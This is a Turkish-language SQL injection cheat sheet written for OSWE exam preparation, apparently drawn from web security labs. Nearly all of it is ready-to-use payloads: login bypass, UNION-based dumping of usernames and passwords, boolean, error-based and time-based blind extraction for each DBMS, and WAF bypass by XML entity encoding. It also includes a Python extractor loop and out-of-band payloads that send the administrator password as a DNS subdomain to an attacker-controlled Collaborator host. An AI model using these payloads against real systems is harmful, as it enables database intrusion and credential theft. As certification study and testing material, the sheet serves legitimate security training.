# SQL Injection Cheat Sheet (OSWE odaklı)

> **Kural:** Manuel çalış, sqlmap yok. Blind'de kendi Python extractor'ını yaz. Önce DBMS'i tespit et, syntax ona göre değişir.

---

## 0. Tespit (injection var mı?)
- Tek tırnak `'` → hata/500 = string context'te injection olası.
- `'--` ile tırnağı dengele, hata kaybolursa doğrulandı.
- Sayısal context: `1` yerine `1-0`, `2-1` dene (değer değişiyorsa injection).

## 1. Yorum (comment) syntax — DBMS'e göre
| DBMS | Yorum |
|------|-------|
| MySQL | `-- ` (arkasında BOŞLUK şart), `#`, `/*...*/` |
| PostgreSQL | `--`, `/*...*/` |
| MSSQL | `--`, `/*...*/` |
| Oracle | `--` |

URL'de boşluk = `+`. Güvenli: `-- -`.

## 2. WHERE clause / mantık
- Tüm satırlar: `' OR 1=1--`
- Login bypass (username alanı): `administrator'--` ya da `' OR 1=1 LIMIT 1--`
- Not: `AND`, `OR`'dan önce bağlar (precedence).

## 3. Kolon sayısı (UNION öncesi şart)
- **ORDER BY:** `' ORDER BY 1--`, `2--`... hata verene kadar. Hatanın bir eksiği = kolon sayısı.
- **UNION NULL:** `' UNION SELECT NULL--`, `NULL,NULL--`... hata gidene kadar. `NULL` her tipe uyar.

## 4. Text tutan kolonu bul
```
' UNION SELECT 'a',NULL,NULL,NULL--
```
Sayfada `a` görünen kolon = string döndürebilir. Oracle'da `FROM dual` gerekir:
```
' UNION SELECT 'a',NULL FROM dual--
```

## 5. DBMS versiyon / fingerprint
| DBMS | Versiyon |
|------|----------|
| MySQL / MSSQL | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| Oracle | `SELECT banner FROM v$version` |

> Hızlı ayrım: `SUBSTRING`+`SUBSTR` ikisi de çalışıyorsa → PostgreSQL/MySQL (Oracle `SUBSTRING`'i, MSSQL `SUBSTR`'ı reddeder).

## 6. String birleştirme (concat)
| DBMS | Concat |
|------|--------|
| Oracle / PostgreSQL | `'foo'||'bar'` |
| MSSQL | `'foo'+'bar'` |
| MySQL | `CONCAT('foo','bar')` |

İki veriyi tek kolonda: `username||'~'||password`

## 7. Tablo / kolon keşfi
**MySQL / MSSQL / PostgreSQL:**
```
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```
**Oracle:** `all_tables` / `all_tab_columns`

## 8. Veri çekme
```
' UNION SELECT username,password FROM users--
' UNION SELECT username||'~'||password,NULL FROM users--   (tek kolon varsa)
```

## 9. Blind SQLi (çıktı görünmez — OSWE'nin kalbi)

### 9a. Boolean-based
```
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--
```
Tespit: `"Welcome back" in r.text`. Karakter karakter → Python.

### 9b. Error-based blind (true/false'u hatadan oku)
```
# PostgreSQL:
' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN 1/0 ELSE 'a' END FROM users WHERE username='administrator')='a
# Oracle:
' AND (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a
```
TRUE → `1/0` → 500. Tespit: `r.status_code == 500`. Tek satır için `WHERE username='administrator'` ŞART.

### 9c. Time-based
```
# Doğrulama (tek atış): '||pg_sleep(10)--
# Çekme: '||(SELECT CASE WHEN (SUBSTRING(password,{i},1)='{char}') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
```
Tespit: `r.elapsed.total_seconds() > 2.5`. Jitter'a karşı hit'i 2 kez doğrula.
| DBMS | Inline gecikme |
|------|----------------|
| PostgreSQL | `'||pg_sleep(10)--` |
| Oracle | `'||dbms_pipe.receive_message(('a'),10)--` |
| MySQL | `' AND SLEEP(10)--` |
| MSSQL | `'; WAITFOR DELAY '0:0:10'--` |
> Gotcha'lar: inline `||` (stacked `;` çoğu PG sürücüsünde çalışmaz); cookie'de BOŞLUK kullanma (ilk boşlukta kesilir); doğru endpoint + cache'e dikkat.

### 9d. Out-of-band (OAST — Burp Collaborator)
Hiçbir in-band sinyal yoksa (asenkron sorgu) → VT'yi senin sunucuna istek attır. DNS en güvenilir kanal.
```
# Interaction (Oracle XML entity):
'||(SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://<COLLAB>/"> %remote;]>'),'/l') FROM dual)--
# Exfiltration (değeri subdomain'e göm):
'||(SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.<COLLAB>/"> %remote;]>'),'/l') FROM dual)--
```
Şifre, DNS/HTTP isteğinin subdomain'i olarak Collaborator'a düşer. Tek atış, Python yok.
| DBMS | OOB |
|------|-----|
| Oracle | `UTL_INADDR.get_host_address`, `UTL_HTTP`, XML entity |
| MSSQL | `exec master..xp_dirtree '//<COLLAB>/a'` |
| PostgreSQL | `copy (SELECT '') to program 'nslookup <COLLAB>'` (superuser) |
| MySQL | `LOAD_FILE('\\\\<COLLAB>\\a')` (Windows+FILE) |

## 10. Python blind extractor iskeleti
```python
import requests, string
URL = "https://TARGET/..."
charset = string.ascii_lowercase + string.digits
secret = ""
for pos in range(1, 40):
    for c in charset:
        payload = f"...SUBSTRING((SELECT password...),{pos},1)='{c}'--"
        r = requests.get(URL, params={"category": payload})
        if "WELCOME_MARKER" in r.text:
            secret += c; print(secret); break
    else:
        break
```
Time-based → `if r.elapsed.total_seconds() > 4:`, error-based → `if r.status_code == 500:`.

## 11. Visible error-based (görünür detaylı hata varsa — tek atış, Python yok)
```
# PostgreSQL CAST:  ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
# PostgreSQL ::int: ' AND (SELECT password FROM users LIMIT 1)::int=1--
```
→ `invalid input syntax for type integer: "DEĞER"` → şifre mesajda. Önce `username` ile teyit.
**Hata KIRPILIYORSA:** payload kısalt → TrackingId'i boş gönder, `::int` kullan, `LIMIT`/`WHERE` at.
| DBMS | Error-based |
|------|-------------|
| MySQL | `extractvalue(1,concat(0x7e,(SELECT ...)))` |
| MSSQL | `CONVERT(int,(SELECT ...))` |
| Oracle | `CAST((SELECT ...) AS int)` |

## 12. Filter / WAF bypass
- **Farklı context:** aynı girdi JSON/XML olarak işleniyorsa oradan dene.
- **XML char encoding (çalışan yöntem):** yasak kelimeyi HTML-entity'ye çevir, sunucu decode edip SQL'e geçirir:
  ```xml
  <stockCheck><productId>3</productId>
  <storeId>1 UNION SELECT username||'~'||password FROM users</storeId></stockCheck>
  ```
  `&#x53;` = `S`. **Burp Hackvertor** → metni seç → Encode → `hex_entities`.
- Diğer: `SE/**/LECT`, case (`SeLeCt`), çift encode, boşluk yerine `/**/` veya `%0a`.

---

## Karar ağacı
- Veri response'ta görünüyor mu? → **UNION**
- Hata görünür (detaylı) mi? → **CAST ile hatadan oku** (tek atış)
- Görünmez ama sayfa değişiyor mu? → **boolean blind** (Python)
- Hata true/false ayırt ettiriyor mu? → **error-based blind** (Python)
- Hiçbiri yok, senkron mu? → **time-based** (Python)
- Hiçbiri yok, asenkron mu? → **OAST / Collaborator** (tek atış)
